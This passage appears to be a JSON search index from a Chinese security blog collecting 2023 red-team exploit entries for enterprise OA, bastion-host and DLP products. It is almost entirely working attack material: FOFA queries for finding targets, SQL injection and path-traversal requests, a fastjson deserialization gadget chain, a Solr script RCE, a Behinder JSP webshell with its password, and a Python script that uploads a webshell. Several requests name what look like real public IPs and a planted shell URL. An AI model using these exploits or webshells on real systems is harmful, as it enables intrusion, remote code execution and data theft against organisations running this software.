form-data; name=\"file\"; filename=\"1.jsp\" Content-Type: application/octet-stream \u003c%out.print(\"test\");%\u003e --b0d829daa06c13d6b3e16b0ad21d1eed-- 上传文件地址：http://your-ip/defaultroot/upload/abc(path参数的值)/202311(现年月)/(返回的文件名).jsp ","date":"2023-12-08","objectID":"/%E4%B8%87%E6%88%B7oa-upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"万户OA-upload任意文件上传漏洞","uri":"/%E4%B8%87%E6%88%B7oa-upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"万户协同办公平台存在未授权访问漏洞 GET /defaultroot/evoInterfaceServlet?paramType=user ","date":"2023-12-08","objectID":"/%E4%B8%87%E6%88%B7%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"万户协同办公平台存在未授权访问漏洞","uri":"/%E4%B8%87%E6%88%B7%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"万户协同办公平台接口存在文件上传漏洞 POST /defaultroot/wpsservlet?option=saveNewFile\u0026newdocld=jsp\u0026dir=../platform/portal/layout/\u0026fileType=.jsp HTTP/1.1 Host:xxx.xxx.xxx.xxx User-Agent: Content-Length:266 Cache-Control:max-age=0 Content-Type:multipart/form-data;boundary=803e058d60f347f7b3c17fa95228eca6 Accept-Encoding: gzip,deflate Connection:close --221e166d60f34112b3c17fa95818ecfe Content-Disposition:form-data;name=\"NewFile\";filename=\"jsp.jsp\" \u003c% jsp 上传的木马地址 %\u003e --221e166d60f34112b3c17fa95818ecfe-- ","date":"2023-12-08","objectID":"/%E4%B8%87%E6%88%B7%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"万户协同办公平台接口存在文件上传漏洞","uri":"/%E4%B8%87%E6%88%B7%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## Fofa\rheader=\"sansec\" \u0026\u0026 body=\"密码\" ","date":"2023-12-08","objectID":"/%E4%B8%89%E6%9C%AA%E4%BF%A1%E5%AE%89-srj1909-%E8%AE%BE%E5%A4%87%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"三未信安 SRJ1909 设备默认密码漏洞","uri":"/%E4%B8%89%E6%9C%AA%E4%BF%A1%E5%AE%89-srj1909-%E8%AE%BE%E5%A4%87%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"默认密码 swxa@1234 ","date":"2023-12-08","objectID":"/%E4%B8%89%E6%9C%AA%E4%BF%A1%E5%AE%89-srj1909-%E8%AE%BE%E5%A4%87%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"三未信安 SRJ1909 设备默认密码漏洞","uri":"/%E4%B8%89%E6%9C%AA%E4%BF%A1%E5%AE%89-srj1909-%E8%AE%BE%E5%A4%87%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\rGET /Home/AccordionIndex HTTP/1.1 Host: 58.87.96.103:8081 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Cookie: LoginUserKey=13C2C1A702AE2DE0B13BAE5085D505F75E94A75EFE2500EC034DF8E3BE42BA36EA6EE41F2890656FE1073EFC6A92DCCF30367C8AFBAE0C34F0AC4F76B8C0995F73E764F9DDC7464272886569FBF022E1E2F6AA660D98726196A52EE3D49CF23551B118CE998A80BA2DF082D251F7411EDC6F055586EE5FD0F821B8AAA1E9B1C0FB69D508A9EC5536060349B467EEA2BADBA50F7383A2F997C6E8D057F8F434E1EAF92C642D04E179CF8F1D0FC1205FAF989DD811574D86FB781EF9623D2C9963AE101FF5F244EEE88C998F80CF554B4221D15969D5BC5D63C912D21D668581DC04AF3C0373EDA26601BC6157271F91F7F3087B03AE0D2304347BDCD129D94421A804D23CCFF4851D1559B78B6643B38720D4F3DD28D24EF120D19EFDBF8B6E5195AFA767736E3DCB00CDEA2983B0FE5815A97406D8D89ACF33528D961B701B0AE605261D80DEB27453806A4DBB38B5259BCCFA1E0CDB406A53C31258FC90F0136CA25631DF6E6487CC16CEF97330926F71AADDE01BDB149035BED1921D7321177BB3484BA8D134C07675660EE8D203AA6929B88D6995D485; Accept-Encoding: gzip ","date":"2023-12-08","objectID":"/%E4%B8%8A%E6%B5%B7%E5%8A%9B%E8%BD%AF%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"上海力软敏捷开发框架登陆绕过漏洞","uri":"/%E4%B8%8A%E6%B5%B7%E5%8A%9B%E8%BD%AF%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rcert=\"Baolei\"||title=\"麒麟堡垒机\"||body=\"admin.php?controller=admin_index\u0026action=get_user_login_fristauth\"||body=\"admin.php?controller=admin_index\u0026action=login\" ","date":"2023-12-08","objectID":"/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BA-admin_commonuser-sql%E6%B3%A8%E5%85%A5/:0:0","tags":["2023hw"],"title":"中远麒麟堡垒机 admin_commonuser SQL注入","uri":"/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BA-admin_commonuser-sql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw"],"content":"poc poc: relative: req0 \u0026\u0026 req1 session: false requests: - method: POST timeout: 10 path: /admin.php?controller=admin_commonuser headers: Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2786.81 Safari/537.36 data: username=admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm follow_redirects: true matches: (code.eq(\"200\") \u0026\u0026 time.gt(\"5\") \u0026\u0026 time.lt(\"10\")) - method: POST timeout: 10 path: /admin.php?controller=admin_commonuser headers: User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2786.81 Safari/537.36 Content-Type: application/x-www-form-urlencoded data: username=admin follow_redirects: true matches: time.lt(\"5\") ","date":"2023-12-08","objectID":"/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BA-admin_commonuser-sql%E6%B3%A8%E5%85%A5/:1:0","tags":["2023hw"],"title":"中远麒麟堡垒机 admin_commonuser SQL注入","uri":"/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BA-admin_commonuser-sql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw漏洞"],"content":"中远麒麟堡垒机SQL注入 麒麟堡垒机用于运维管理的认证、授权、审计等监控管理。中远麒麟堡垒机存在SQL注入，可利用该漏洞获取系统敏感信息。 ","date":"2023-12-08","objectID":"/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BAsql%E6%B3%A8%E5%85%A5/:1:0","tags":["2023hw漏洞"],"title":"中远麒麟堡垒机SQL注入","uri":"/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BAsql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw漏洞"],"content":"检索条件： cert=“Baolei” 或 title=“麒麟堡垒机” 或 body=“admin.php?controller=admin_index\u0026action=get_user_login_fristauth” 或 body=“admin.php?controller=admin_index\u0026action=login” poc: relative: req0 \u0026\u0026 req1 session: false requests: - method: POST timeout: 10 path: /admin.php?controller=admin_commonuser headers: Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2786.81 Safari/537.36 data: username=admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm follow_redirects: true matches: (code.eq(\"200\") \u0026\u0026 time.gt(\"5\") \u0026\u0026 time.lt(\"10\")) - method: POST timeout: 10 path: /admin.php?controller=admin_commonuser headers: User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2786.81 Safari/537.36 Content-Type: application/x-www-form-urlencoded data: username=admin follow_redirects: true matches: time.lt(\"5\") ","date":"2023-12-08","objectID":"/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BAsql%E6%B3%A8%E5%85%A5/:2:0","tags":["2023hw漏洞"],"title":"中远麒麟堡垒机SQL注入","uri":"/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BAsql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw漏洞"],"content":"请求包 POST /admin.php?controller=admin_commonuser HTTP/1.1 Host: ip:port User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Connection: close Content-Length: 78 Accept: */* Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip username=admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm ","date":"2023-12-08","objectID":"/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BAsql%E6%B3%A8%E5%85%A5/:3:0","tags":["2023hw漏洞"],"title":"中远麒麟堡垒机SQL注入","uri":"/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BAsql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw漏洞"],"content":"云匣子堡垒机fastjson漏洞 ","date":"2023-12-08","objectID":"/%E4%BA%91%E5%8C%A3%E5%AD%90%E5%A0%A1%E5%9E%92%E6%9C%BAfastjson%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"云匣子堡垒机fastjson漏洞","uri":"/%E4%BA%91%E5%8C%A3%E5%AD%90%E5%A0%A1%E5%9E%92%E6%9C%BAfastjson%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa body=\"type=application/x-xtx-axhost\" \u0026\u0026 cert=\"云匣子\" app=\"云安宝-云匣子\" ","date":"2023-12-08","objectID":"/%E4%BA%91%E5%8C%A3%E5%AD%90%E5%A0%A1%E5%9E%92%E6%9C%BAfastjson%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"云匣子堡垒机fastjson漏洞","uri":"/%E4%BA%91%E5%8C%A3%E5%AD%90%E5%A0%A1%E5%9E%92%E6%9C%BAfastjson%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc POST /3.0/authService/config HTTP/1.1 Host: your-ip User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Cmd: id Content-Type: application/json;charset=utf-8 Origin: https://your-ip Referer: https://your-ip Accept-Encoding: gzip Connection: close { \"a\": { \"@type\": \"java.lang.Class\", \"val\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\" }, \"b\": { \"@type\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\", \"userOverridesAsString\": \"HexAsciiSerializedMap:aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000047372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200206a617661782e7363726970742e536372697074456e67696e654d616e61676572000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000074000b6e6577496e7374616e6365757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007371007e00137571007e0018000000017400026a7374000f676574456e67696e6542794e616d657571007e001b00000001767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707371007e00137571007e00180000000174202b747279207b0a20206c6f616428226e6173686f726e3a6d6f7a696c6c615f636f6d7061742e6a7322293b0a7d20636174636820286529207b7d0a66756e6374696f6e20676574556e7361666528297b0a202076617220746865556e736166654d6574686f64203d206a6176612e6c616e672e436c6173732e666f724e616d65282273756e2e6d6973632e556e7361666522292e6765744465636c617265644669656c642827746865556e7361666527293b0a2020746865556e736166654d6574686f642e73657441636365737369626c652874727565293b200a202072657475726e20746865556e736166654d6574686f642e676574286e756c6c293b0a7d0a66756e6374696f6e2072656d6f7665436c617373436163686528636c617a7a297b0a202076617220756e73616665203d20676574556e7361666528293b0a202076617220636c617a7a416e6f6e796d6f7573436c617373203d20756e736166652e646566696e65416e6f6e796d6f7573436c61737328636c617a7a2c6a6176612e6c616e672e436c6173732e666f724e616d6528226a6176612e6c616e672e436c61737322292e6765745265736f75726365417353747265616d2822436c6173732e636c61737322292e72656164416c6c427974657328292c6e756c6c293b0a2020766172207265666c656374696f6e446174614669656c64203d20636c617a7a416e6f6e796d6f7573436c6173732e6765744465636c617265644669656c6428227265666c656374696f6e4461746122293b0a2020756e736166652e7075744f626a65637428636c617a7a2c756e736166652e6f626a6563744669656c644f6666736574287265666c656374696f6e446174614669656c64292c6e756c6c293b0a7d0a66756e6374696f6e206279706173735265666c656374696f6e46696c7465722829207b0a2020766172207265666c656374696f6e436c6173733b0a2020747279207b0a20202020","date":"2023-12-08","objectID":"/%E4%BA%91%E5%8C%A3%E5%AD%90%E5%A0%A1%E5%9E%92%E6%9C%BAfastjson%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"云匣子堡垒机fastjson漏洞","uri":"/%E4%BA%91%E5%8C%A3%E5%AD%90%E5%A0%A1%E5%9E%92%E6%9C%BAfastjson%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## poc\rPOST /CDGServer3/ClientAjax HTTP/1.1 Host: 171.221.235.168:88 Content-Length: 79 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 Origin: http://171.221.235.168:88 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://171.221.235.168:88/CDGServer3/ClientAjax Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=DFDE05B340E896E74D77626D2DC0DE59 Connection: close command=downclientpak\u0026InstallationPack=../WEB-INF/web.xml\u0026forward=index.jsp ","date":"2023-12-08","objectID":"/%E4%BA%BF%E5%A1%9E%E9%80%9A-clientajax-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"亿塞通 ClientAjax 任意文件下载漏洞","uri":"/%E4%BA%BF%E5%A1%9E%E9%80%9A-clientajax-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## poc\rhttp://112.6.162.68:8090/CDGServer3/workflowE/useractivate/update.jsp?flag=1\u0026ids=1,3);WAITFOR%20DELAY%20%270:0:2%27-- ","date":"2023-12-08","objectID":"/%E4%BA%BF%E5%A1%9E%E9%80%9A-update.jsp-sql%E6%B3%A8%E5%85%A5/:0:0","tags":["2023hw"],"title":"亿塞通 update.jsp sql注入","uri":"/%E4%BA%BF%E5%A1%9E%E9%80%9A-update.jsp-sql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw"],"content":"## fofa\r(title==\"数据泄露防护(DLP)系统\" \u0026\u0026 body=\"/CDGServer3/index.jsp\") || (body=\"CDGServer3\" \u0026\u0026 body=\"DLP\") || (body=\"亿赛通数据脱敏系统\" \u0026\u0026 body=\"mainBtnPanel\") CDGServer3/3g/ ","date":"2023-12-08","objectID":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-dlp-uploadfilefromclientserviceforclient-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"亿赛通 DLP UploadFileFromClientServiceForClient 文件上传漏洞","uri":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-dlp-uploadfilefromclientserviceforclient-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc POST /CDGServer3/UploadFileFromClientServiceForClient?a=CMAMNFHNNEBDPBHMEIHGKDDBFCKMEEEINIHMHLPFPLCFNLDLAHCONNAPDPHMILDIJJNILOBGOOHPNGEKMGEBBLMCFCMMCAOOJEHLJOIHPGELPOGLPDEFACNAKFMHAALBDMAEBGGODDKHMJACJCBDDACPGFLHIEINJCDMPNIDHJKPFGKKCMHNEPLPLPFOCMGGCHCEFFDPFGFCFCDEDJFMCIBEFFGNGN HTTP/1.1 Host: 116.6.193.207:8443 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip Content-Length: 1410 \u003c%@page import=\"java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*\" %\u003e\u003c%! class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64 = Class.forName(\"java.util.Base64\"); Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null); value = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(decoder, new Object[]{bs});} catch (Exception e) {try { base64 = Class.forName(\"sun.misc.BASE64Decoder\"); Object decoder = base64.newInstance(); value = (byte[]) decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(decoder, new Object[]{bs}); } catch (Exception e2) {}}return value;}%\u003e\u003c% if(request.getMethod().equals(\"POST\")){String k = \"e45e329feb5d925b\";session.putValue(\"u\", k);Cipher c = Cipher.getInstance(\"AES\");c.init(2, new SecretKeySpec(k.getBytes(), \"AES\"));StringBuilder sb = new StringBuilder();InputStream inputStream = request.getInputStream();BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));String line;while ((line = reader.readLine()) != null) {sb.append(line);}String data = sb.toString();byte[] bytes = c.doFinal(base64Decode(data));new U(this.getClass().getClassLoader()).g(bytes).newInstance().equals(pageContext);}%\u003e WebShell URL: https://116.6.193.207:8443/A021F84dCcfeBBd3.jsp Password: rebeyond WebShell tool: Behinder v3.0 Webshell type: jsp ","date":"2023-12-08","objectID":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-dlp-uploadfilefromclientserviceforclient-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"亿赛通 DLP UploadFileFromClientServiceForClient 文件上传漏洞","uri":"/%E4%BA%BF%E8%B5%9B%E9%80%9A-dlp-uploadfilefromclientserviceforclient-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## poc\rhttp://171.221.235.168:88/CDGServer3/12345.jsp POST /CDGServer3/DecryptApplicationService2?fileId=../../../Program+Files+(x86)/ESAFENET/CDocGuard+Server/tomcat64/webapps/CDGServer3/12345.jsp HTTP/1.1 Host: 171.221.235.168:88 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,app lication/signed-exchange;v=b3;q=0.9 Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=E3B40EDFAC72A292489DBF7019B4AEA6 Connection: close Content-Length: 273 \u003c%@page import=\"java.text.*,java.util.*,java.io.*\"%\u003e \u003c% SimpleDateFormat df = new SimpleDateFormat(\"yyy-MM-dd HH:mm:ss\"); out.println(df.format(new Date())); out.println(\"aaa\"); File file = new File(application.getRealPath(request.getServletPath())); file.delete(); %\u003e HTTP/1.1 200 Set-Cookie: JSESSIONID=8104BF8F2B4BF11989168FBB26A100E0; Path=/CDGServer3; HttpOnly Content-Length: 0 Date: Fri, 18 Aug 2023 07:40:05 GMT ","date":"2023-12-08","objectID":"/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-decryptapplicationservice2-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"亿赛通电子文档安全管理系统 DecryptApplicationService2 任意文件上传漏洞","uri":"/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-decryptapplicationservice2-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"亿赛通电子文档安全管理系统远程命令执行漏洞 网络测绘 fofa: app=“亿赛通-电子文档安全管理系统” hunter: web.title=“电子文档安全管理系统” POST /solr/flow/dataimport?command=full-import\u0026verbose=false\u0026clean=false\u0026commit=false\u0026debug=true\u0026core=tika\u0026name=dataimport\u0026dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22whoami%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20 HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.1383.67 Safari/537.36 Accept-Encoding: gzip, deflate Accept: */* Connection: close Host: Content-Length: 78 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cRDF\u003e \u003citem/\u003e \u003c/RDF\u003e ","date":"2023-12-08","objectID":"/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"亿赛通电子文档安全管理系统远程命令执行漏洞","uri":"/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"亿赛通电子文档平台文件上传漏洞 import requests from urllib.parse import urljoin import sys payload=\"/CDGServer3/fileType/importFileType.do?flag=syn_user_policy\" request_file = {'fileshare':(('/..\\..\\..\\..\\webapps\\ROOT\\\\tool.jsp',\"\"\"\u003c%! class U extends ClassLoader { U(ClassLoader c) { super(c); } public Class g(byte[] b) { return super.defineClass(b, 0, b.length); } } public byte[] base64Decode(String str) throws Exception { try { Class clazz = Class.forName(\"sun.misc.BASE64Decoder\"); return (byte[]) clazz.getMethod(\"decodeBuffer\", String.class).invoke(clazz.newInstance(), str); } catch (Exception e) { Class clazz = Class.forName(\"java.util.Base64\"); Object decoder = clazz.getMethod(\"getDecoder\").invoke(null); return (byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, str); } } %\u003e \u003c% String cls = request.getParameter(\"passwd\"); if (cls != null) { new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext); } %\u003e\"\"\"))} def title(): print(\"\"\" 亿赛通文件上传 \"\"\") def exp(url): url1=urljoin(url,payload) req=requests.post(url=url1,files=request_file,verify=False,timeout=5) shell=urljoin(url,\"tool.jsp\") if(req.text.find(\"xmlFail\")\u003e0): print(\"成功！\") print(\"蚁剑连接地址%s,密码passwd\"%shell) if __name__ == '__main__': title if(len(sys.argv) !=2): 